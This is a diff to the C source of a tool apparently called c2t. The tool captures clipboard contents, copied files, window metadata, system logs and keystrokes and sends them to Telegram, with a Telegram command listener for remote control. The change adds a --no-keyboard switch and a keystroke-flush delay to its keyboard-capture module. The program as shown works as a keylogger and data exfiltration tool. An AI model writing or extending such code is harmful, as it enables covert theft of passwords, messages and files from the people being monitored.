@@ -74,7 +74,9 @@ static void print_usage(FILE *stream)
         "  --send-files           Send copied files\n"
         "  --send-window-info     Include clipboard source metadata\n"
         "  --send-logs            Periodically send system log files to Telegram\n"
-        "  --log-interval <sec>   Interval in seconds to send log files (5-86400)\n\n"
+        "  --log-interval <sec>   Interval in seconds to send log files (5-86400)\n"
+        "  --no-keyboard          Disable keyboard monitoring\n"
+        "  --keyboard-flush <ms>  Inactivity delay before sending keystrokes (500-60000 ms)\n\n"
         "Stop options:\n"
         "  --force                Force termination after the timeout\n");
 }
@@ -198,6 +200,9 @@ static void print_usage(FILE *stream)
     c2t_log_info("config", "Periodic Telegram log sending=%s, interval=%llu s",
                  c2t_config_get()->telegram_send_logs ? "enabled" : "disabled",
                  (unsigned long long)c2t_config_get()->telegram_log_interval_sec);
+    c2t_log_info("config", "Keyboard monitoring=%s, inactivity flush=%llu ms",
+                 c2t_config_get()->disable_keyboard ? "disabled" : "enabled",
+                 (unsigned long long)c2t_config_get()->keyboard_flush_ms);
     c2t_log_info("config", "Delivery queue: max_items=%llu, max_bytes=%llu",
                  (unsigned long long)c2t_config_get()->queue_max_items,
                  (unsigned long long)c2t_config_get()->queue_max_bytes);
@@ -217,7 +222,7 @@ static void print_usage(FILE *stream)
         if (!is_worker) c2t_runtime_release();
         return 1;
     }
-    if (!keyboard_output_init()) {
+    if (!c2t_config_get()->disable_keyboard && !keyboard_output_init()) {
         c2t_log_error("main", "Keyboard delivery worker initialization failed");
         clipboard_output_cleanup();
         telegram_cleanup();
@@ -226,7 +231,7 @@ static void print_usage(FILE *stream)
     }
     if (!c2t_log_sender_init()) {
         c2t_log_error("main", "Log sender initialization failed");
-        keyboard_output_cleanup();
+        if (!c2t_config_get()->disable_keyboard) keyboard_output_cleanup();
         clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
@@ -235,14 +240,16 @@ static void print_usage(FILE *stream)
     if (!c2t_telegram_listener_init()) {
         c2t_log_error("main", "Telegram command listener initialization failed");
         c2t_log_sender_cleanup();
-        keyboard_output_cleanup();
+        if (!c2t_config_get()->disable_keyboard) keyboard_output_cleanup();
         clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
         return 1;
     }
-    if (!keyboard_listener_init()) {
-        c2t_log_warning("main", "Keyboard listener initialization failed (continuing)");
+    if (!c2t_config_get()->disable_keyboard) {
+        if (!keyboard_listener_init()) {
+            c2t_log_warning("main", "Keyboard listener initialization failed (continuing)");
+        }
     }
 
     if (!is_worker)
@@ -250,10 +257,14 @@ static void print_usage(FILE *stream)
     c2t_log_info("main", "Starting clipboard listener");
     int result = clipboard_listen();
     c2t_log_info("main", "Clipboard listener stopped with result %d", result);
-    keyboard_listener_cleanup();
+    if (!c2t_config_get()->disable_keyboard) {
+        keyboard_listener_cleanup();
+    }
     c2t_telegram_listener_cleanup();
     c2t_log_sender_cleanup();
-    keyboard_output_cleanup();
+    if (!c2t_config_get()->disable_keyboard) {
+        keyboard_output_cleanup();
+    }
     clipboard_output_cleanup();
     telegram_cleanup();
     c2t_log_info("main", "Shutdown complete");
